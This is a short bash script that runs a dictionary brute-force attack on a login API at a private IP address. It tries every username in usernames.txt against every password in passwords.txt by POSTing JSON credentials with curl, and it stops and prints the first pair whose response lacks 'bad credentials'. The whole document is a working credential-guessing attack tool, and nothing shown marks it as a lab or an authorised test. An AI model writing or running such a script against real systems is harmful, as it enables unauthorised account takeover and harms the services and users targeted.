#!/usr/bin/env bash

URL="http://10.67.132.175:13401/v1/auth/login"

while read user; do
  while read pass; do
    echo "[*] Trying $user : $pass"
    RESPONSE=$(curl -s -X POST "$URL" \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$user\", \"password\":\"$pass\"}")
    
    if [[ ! "$RESPONSE" =~ "bad credentials" ]]; then
      echo "✅ SUCCESS: $user : $pass"
      echo "Response: $RESPONSE"
      exit
    fi
  done < passwords.txt
done < usernames.txt

